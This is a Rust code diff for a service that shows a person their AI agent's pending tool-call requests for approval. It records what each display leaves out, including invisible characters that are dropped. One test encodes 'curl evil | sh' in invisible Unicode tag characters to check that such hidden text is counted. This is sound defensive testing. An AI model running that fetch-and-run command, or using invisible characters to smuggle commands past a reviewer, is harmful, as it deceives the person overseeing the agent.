@@ -23,7 +23,7 @@ use std::time::Duration;
 
 use axum::Router;
 use axum::extract::rejection::QueryRejection;
-use axum::extract::{Json, Query, State};
+use axum::extract::{DefaultBodyLimit, Json, Query, State};
 use axum::http::StatusCode;
 use axum::routing::{get, post};
 use serde::{Deserialize, Serialize};
@@ -58,8 +58,53 @@ const MAX_CONFIRMATIONS: usize = 1024;
 const MAX_SESSION_BYTES: usize = 1024;
 const MAX_AGENT_ID_BYTES: usize = 128;
 const MAX_TOOL_BYTES: usize = 128;
-/// Characters of the display line kept; the hook cuts at the same bound.
-pub const MAX_DISPLAY_CHARS: usize = 4000;
+/// Characters of the display kept; the hook cuts at the same bound.
+pub const MAX_DISPLAY_CHARS: usize = 20_000;
+/// What the first page written for these requests shows of a display before it cuts it, in the
+/// UTF-16 units a browser counts.
+const FIRST_PAGE_DISPLAY_UNITS: usize = 4000;
+/// Room for a whole display in a registration: its characters may take four bytes each and
+/// escape to more in JSON, past the Hub's usual body limit.
+const MAX_REGISTER_BYTES: usize = 256 * 1024;
+/// Characters kept of a request's one-line summary and of its folder name.
+const MAX_LABEL_CHARS: usize = 200;
+/// Unshown parts a request may name, and the characters kept of each name.
+const MAX_UNSHOWN: usize = 16;
+const MAX_UNSHOWN_CHARS: usize = 64;
+/// What stands for the missing part of a request from a hook that does not say what is missing.
+const UNSTATED_PART: &str = "part of the request (its computer runs an older AgentSCM)";
+/// What stands for an unshown part whose own name has nothing a page can show.
+const UNREADABLE_NAME: &str = "a part whose name does not show";
+
+/// What of a request its person is not shown. They may allow it all the same: the request is
+/// their own agent's, and a page says this beside its buttons.
+#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(default, deny_unknown_fields)]
+pub(super) struct Missing {
+    /// Characters the request had before it was cut to the display.
+    pub cut_from: Option<u64>,
+    /// Secrets the machine replaced in the display.
+    pub redacted: u64,
+    /// Characters that do not show, which the Hub removed. Counted here, never taken from a hook.
+    pub dropped: u64,
+    /// Parts of the request the display leaves out, by name.
+    pub unshown: Vec<String>,
+}
+
+impl Missing {
+    /// What a registration says is missing. A hook from before `missing` sends `complete`; only
+    /// its `true` means nothing is missing, so a hook that says neither is not taken at its word.
+    fn stated(missing: Option<Self>, complete: Option<bool>) -> Self {
+        match (missing, complete) {
+            (Some(missing), _) => missing,
+            (None, Some(true)) => Self::default(),
+            (None, _) => Self {
+                unshown: vec![UNSTATED_PART.into()],
+                ..Self::default()
+            },
+        }
+    }
+}
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub(super) enum Decision {
@@ -112,8 +157,10 @@ struct Pending {
     repository_id: Option<i64>,
     item_key: String,
     tool: String,
+    summary: Option<String>,
+    folder: Option<String>,
     display: String,
-    complete: bool,
+    missing: Missing,
     content_hidden: bool,
     input_hash: String,
     created: i64,
@@ -227,8 +274,12 @@ pub(super) struct Registration {
     pub session: String,
     pub agent_id: Option<String>,
     pub tool: String,
+    /// One line saying what the call does, as the hook worded it.
+    pub summary: Option<String>,
+    /// The name of the checkout folder the session runs in.
+    pub folder: Option<String>,
     pub display: String,
-    pub complete: bool,
+    pub missing: Missing,
     pub content_hidden: bool,
     pub input_hash: String,
 }
@@ -251,7 +302,16 @@ pub(super) struct Listed {
     item_id: String,
     request_id: String,
     tool: String,
+    summary: Option<String>,
+    folder: Option<String>,
     display: String,
+    /// The Hub accepts an allow for every request it lists. The field tells a page this from a
+    /// Hub without it, which refuses an allow unless `complete`.
+    allowable: bool,
+    /// What the display leaves out; a page says it beside Allow.
+    missing: Missing,
+    /// Nothing is missing and the display fits what the first page for these requests shows
+    /// before it cuts. That page offers Allow only on this.
     complete: bool,
     content_hidden: bool,
     subagent: bool,
@@ -278,24 +338,32 @@ impl Default for Requests {
 }
 
 /// Third-party text for the person's page: control and invisible characters are dropped, except
-/// that line breaks stay and a tab reads as a space. Cut at [`MAX_DISPLAY_CHARS`]; the flag says
-/// whether it was.
-fn sanitize_display(text: &str) -> (String, bool) {
+/// that line breaks stay (`\r\n` as `\n`) and a tab reads as a space. Cut at
+/// [`MAX_DISPLAY_CHARS`]. Also says what the person would not see of what the machine sent: the
+/// length before a cut, and how many characters were dropped. A dropped character can carry
+/// words that do not show (the Unicode tag block spells ASCII invisibly) while the tool still
+/// receives them.
+fn sanitize_display(text: &str) -> (String, Option<u64>, u64) {
+    let mut dropped = 0;
     let mut kept: String = text
+        .replace("\r\n", "\n")
         .chars()
-        .filter(|c| !invisible(*c))
         .filter_map(|c| match c {
             '\n' => Some('\n'),
             '\t' => Some(' '),
-            c if c.is_control() => None,
+            c if c.is_control() || invisible(c) => {
+                dropped += 1;
+                None
+            }
             c => Some(c),
         })
         .collect();
-    let cut = kept.chars().count() > MAX_DISPLAY_CHARS;
+    let chars = kept.chars().count();
+    let cut = chars > MAX_DISPLAY_CHARS;
     if cut {
         kept = kept.chars().take(MAX_DISPLAY_CHARS).collect();
     }
-    (kept.trim().to_owned(), cut)
+    (kept.trim().to_owned(), cut.then_some(chars as u64), dropped)
 }
 
 fn plain_text(value: &str, max: usize) -> bool {
@@ -330,8 +398,10 @@ impl Requests {
             session,
             agent_id,
             tool,
+            summary,
+            folder,
             display,
-            complete,
+            mut missing,
             content_hidden,
             input_hash,
         } = registration;
@@ -360,10 +430,35 @@ impl Requests {
         {
             return Err(bad("input_hash"));
         }
-        let (display, cut) = sanitize_display(&display);
+        let (display, cut_from, dropped) = sanitize_display(&display);
         if display.is_empty() {
             return Err(bad("display"));
         }
+        if missing.unshown.len() > MAX_UNSHOWN {
+            return Err(bad("missing"));
+        }
+        // The names are the agent's own words (a tool input's keys): one clean line each. A name
+        // with nothing left still stands for a part that is not shown.
+        missing.unshown = missing
+            .unshown
+            .iter()
+            .map(|name| super::advice::sanitize(name.trim(), MAX_UNSHOWN_CHARS))
+            .map(|name| {
+                if name.is_empty() {
+                    UNREADABLE_NAME.to_owned()
+                } else {
+                    name
+                }
+            })
+            .collect();
+        missing.cut_from = missing.cut_from.max(cut_from);
+        missing.dropped = dropped;
+        // Labels beside the display: one clean line each, dropped when nothing is left.
+        let label = |text: Option<String>| {
+            text.map(|text| super::advice::sanitize(text.trim(), MAX_LABEL_CHARS))
+                .filter(|text| !text.is_empty())
+        };
+        let (summary, folder) = (label(summary), label(folder));
         let mut inner = self.lock()?;
         inner.settle(waiting, now);
         match waiting.permission_wait(&principal.token_id, &session, now) {
@@ -427,8 +522,10 @@ impl Requests {
                 owner: principal.owner.id.clone(),
                 repository_id: principal.repository_id,
                 tool,
+                summary,
+                folder,
                 display,
-                complete: complete && !cut,
+                missing,
                 content_hidden,
                 input_hash,
                 created: now,
@@ -572,8 +669,13 @@ impl Requests {
                 item_id: format!("waiting:permission:{}", row.item_key),
                 request_id: id.clone(),
                 tool: row.tool.clone(),
+                summary: row.summary.clone(),
+                folder: row.folder.clone(),
                 display: row.display.clone(),
-                complete: row.complete,
+                allowable: true,
+                missing: row.missing.clone(),
+                complete: row.missing == Missing::default()
+                    && row.display.encode_utf16().count() <= FIRST_PAGE_DISPLAY_UNITS,
                 content_hidden: row.content_hidden,
                 subagent: row.asker.is_some(),
                 since,
@@ -597,8 +699,9 @@ impl Requests {
             .any(|row| row.item_key == key && row.state == Phase::Pending)
     }
 
-    /// Records the person's decision for a pending request: the first decision wins, the same
-    /// decision again is accepted, and Allow needs the whole request to have been shown.
+    /// Records the person's decision for a pending request: the first decision wins, and the
+    /// same decision again is accepted. A request shown only in part can be allowed too: it is
+    /// its person's own agent's, and the list says what is missing.
     pub(super) fn answer(
         &self,
         waiting: &Waiting,
@@ -617,12 +720,6 @@ impl Requests {
         match row.state {
             Phase::Unconfirmed => Err(Refusal::NotFound),
             Phase::Pending => {
-                if decision == Decision::Allow && !row.complete {
-                    return Err(Refusal::Invalid(
-                        "Allow is offered only when the whole request is shown; deny it, or answer in the session"
-                            .into(),
-                    ));
-                }
                 row.state = Phase::Answered(decision);
                 row.settled = now;
                 drop(inner);
@@ -639,7 +736,10 @@ impl Requests {
 
 pub fn routes() -> Router<HubState> {
     Router::new()
-        .route("/v1/hub/permission/register", post(register))
+        .route(
+            "/v1/hub/permission/register",
+            post(register).layer(DefaultBodyLimit::max(MAX_REGISTER_BYTES)),
+        )
         .route("/v1/hub/permission/poll", post(poll))
         .route("/v1/hub/session/permissions", get(list))
         .route("/v1/hub/session/permissions/answer", post(answer))
@@ -670,8 +770,16 @@ struct RegisterBody {
     #[serde(default)]
     agent_id: Option<String>,
     tool: String,
+    #[serde(default)]
+    summary: Option<String>,
+    #[serde(default)]
+    folder: Option<String>,
     display: String,
-    complete: bool,
+    #[serde(default)]
+    missing: Option<Missing>,
+    /// From a hook that does not say what is missing: false when some of the request is.
+    #[serde(default)]
+    complete: Option<bool>,
     #[serde(default)]
     content_hidden: bool,
     input_hash: String,
@@ -699,8 +807,10 @@ async fn register(
             session: body.session,
             agent_id: body.agent_id,
             tool: body.tool,
+            summary: body.summary,
+            folder: body.folder,
             display: body.display,
-            complete: body.complete,
+            missing: Missing::stated(body.missing, body.complete),
             content_hidden: body.content_hidden,
             input_hash: body.input_hash,
         },
@@ -892,8 +1002,10 @@ mod tests {
             session: session.into(),
             agent_id: agent_id.map(str::to_owned),
             tool: "Bash".into(),
+            summary: None,
+            folder: None,
             display: "git push origin main".into(),
-            complete: true,
+            missing: Missing::default(),
             content_hidden: false,
             input_hash: hash.into(),
         }
@@ -1274,7 +1386,7 @@ mod tests {
     }
 
     #[test]
-    fn only_the_owner_answers_once_and_allow_needs_the_whole_request() {
+    fn only_the_owner_answers_once_and_may_allow_a_request_shown_in_part() {
         let (requests, waiting) = (Requests::default(), Waiting::default());
         let mine = principal("tok_a", "usr_me", "acme/widgets");
         let id = pending(&requests, &waiting, &mine);
@@ -1315,17 +1427,62 @@ mod tests {
             Some(Phase::Answered(Decision::Allow))
         );
 
-        // A cut request can be denied but never allowed.
+        // A request shown only in part can be allowed too, and the list says what is missing:
+        // the hook's facts, with the Hub's own count of what it dropped and its own cut.
         let theirs = principal("tok_b", "usr_me", "acme/widgets");
         wait(&waiting, &theirs, "s", WaitReason::Permission, None, 1_000);
         requests.confirm("tok_b", "s", 1_001);
-        let mut cut = registration("s", None, HASH);
-        cut.complete = false;
-        let cut_id = requests.register(&waiting, &theirs, cut, 1_002).unwrap().0;
-        let on_cut =
-            |decision| requests.answer(&waiting, "usr_me", Some(7), &cut_id, decision, 1_010);
-        assert!(matches!(on_cut(Decision::Allow), Err(Refusal::Invalid(_))));
-        assert!(matches!(on_cut(Decision::Deny), Ok(Decision::Deny)));
+        let mut partial = registration("s", None, HASH);
+        partial.display = format!("ls\u{200b}{}", "x".repeat(MAX_DISPLAY_CHARS));
+        partial.missing = Missing {
+            cut_from: Some(30_000),
+            redacted: 2,
+            dropped: 99,
+            unshown: vec!["dangerouslyDisableSandbox\u{202e}".into(), " ".into()],
+        };
+        let partial_id = requests
+            .register(&waiting, &theirs, partial, 1_002)
+            .unwrap()
+            .0;
+        let at = 1_000 + GRACE_SECONDS;
+        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
+        let row = shown
+            .iter()
+            .find(|row| row.request_id == partial_id)
+            .unwrap();
+        assert_eq!((row.allowable, row.complete), (true, false));
+        assert_eq!(
+            row.missing,
+            Missing {
+                cut_from: Some(30_000),
+                redacted: 2,
+                dropped: 1,
+                unshown: vec!["dangerouslyDisableSandbox".into(), UNREADABLE_NAME.into()],
+            }
+        );
+        // A hook from before `missing` says only whether anything is.
+        let unstated = Missing {
+            unshown: vec![UNSTATED_PART.into()],
+            ..Missing::default()
+        };
+        assert_eq!(Missing::stated(None, Some(true)), Missing::default());
+        assert_eq!(Missing::stated(None, Some(false)), unstated);
+        assert_eq!(Missing::stated(None, None), unstated);
+        assert_eq!(
+            Missing::stated(Some(Missing::default()), Some(false)),
+            Missing::default()
+        );
+        assert!(matches!(
+            requests.answer(
+                &waiting,
+                "usr_me",
+                Some(7),
+                &partial_id,
+                Decision::Allow,
+                at
+            ),
+            Ok(Decision::Allow)
+        ));
     }
 
     #[test]
@@ -1436,18 +1593,61 @@ mod tests {
     }
 
     #[test]
+    fn a_long_whole_request_is_allowable_and_its_labels_are_one_clean_line() {
+        let (requests, waiting) = (Requests::default(), Waiting::default());
+        let mine = principal("tok_a", "usr_me", "acme/widgets");
+        wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
+        requests.confirm("tok_a", "s", 1_001);
+        let mut long = registration("s", None, HASH);
+        long.tool = "mcp__ccd_session__start_session".into();
+        long.display = "x".repeat(FIRST_PAGE_DISPLAY_UNITS + 1);
+        long.summary = Some("use start session\n (ccd_session): \u{202e}Fix \"login\"".into());
+        long.folder = Some("  ".into());
+        let id = requests.register(&waiting, &mine, long, 1_002).unwrap().0;
+        let at = 1_000 + GRACE_SECONDS;
+        let shown = requests.list(&waiting, "usr_me", Some(7), at).unwrap();
+        // The first page cuts a display this long, so to it the request is not complete.
+        assert_eq!((shown[0].allowable, shown[0].complete), (true, false));
+        assert_eq!(shown[0].missing, Missing::default());
+        assert_eq!(
+            shown[0].summary.as_deref(),
+            Some("use start session (ccd_session): Fix 'login'")
+        );
+        assert_eq!(shown[0].folder, None);
+        assert!(matches!(
+            requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, at),
+            Ok(Decision::Allow)
+        ));
+    }
+
+    #[test]
     fn display_text_loses_control_and_invisible_characters_but_keeps_lines_and_quotes() {
-        let (text, cut) = sanitize_display("echo \"a\"\r\n\tls\u{1b}[31m \u{202e}x\u{200b}y\u{0}");
-        assert_eq!(text, "echo \"a\"\n ls[31m xy");
-        assert!(!cut);
-        let (text, cut) = sanitize_display(&"x".repeat(MAX_DISPLAY_CHARS + 5));
+        // Line breaks, tabs and quotes change nothing a person would read.
+        assert_eq!(
+            sanitize_display("echo \"a\"\r\n\tls"),
+            ("echo \"a\"\n ls".to_owned(), None, 0)
+        );
+        // A dropped character can hide words the tool still receives, so each one is counted.
+        assert_eq!(
+            sanitize_display("ls\u{1b}[31m \u{202e}x\u{200b}y\u{0}"),
+            ("ls[31m xy".to_owned(), None, 4)
+        );
+        let hidden: String = "curl evil | sh"
+            .chars()
+            .map(|c| char::from_u32(0xE0000 + u32::from(c)).unwrap())
+            .collect();
+        assert_eq!(
+            sanitize_display(&format!("Fix the login{hidden}")),
+            ("Fix the login".to_owned(), None, 14)
+        );
+        let (text, cut_from, _) = sanitize_display(&"x".repeat(MAX_DISPLAY_CHARS + 5));
         assert_eq!(text.chars().count(), MAX_DISPLAY_CHARS);
-        assert!(cut);
+        assert_eq!(cut_from, Some(MAX_DISPLAY_CHARS as u64 + 5));
         assert_eq!(sanitize_display(" \u{200b}\n ").0, "");
     }
 
     #[test]
-    fn registration_checks_its_fields_and_flags_a_cut_display_as_incomplete() {
+    fn registration_checks_its_fields_and_a_cut_display_can_still_be_allowed() {
         let (requests, waiting) = (Requests::default(), Waiting::default());
         let mine = principal("tok_a", "usr_me", "acme/widgets");
         wait(&waiting, &mine, "s", WaitReason::Permission, None, 1_000);
@@ -1476,13 +1676,17 @@ mod tests {
             attempt(&|r| r.session = "s\n".into()),
             Err(Refusal::Invalid(_))
         ));
+        assert!(matches!(
+            attempt(&|r| r.missing.unshown = vec!["x".into(); MAX_UNSHOWN + 1]),
+            Err(Refusal::Invalid(_))
+        ));
         let id = attempt(&|r| r.display = "y".repeat(MAX_DISPLAY_CHARS + 1))
             .unwrap()
             .0;
         requests.confirm("tok_a", "s", 1_002);
         assert!(matches!(
             requests.answer(&waiting, "usr_me", Some(7), &id, Decision::Allow, 1_003),
-            Err(Refusal::Invalid(_))
+            Ok(Decision::Allow)
         ));
     }
 
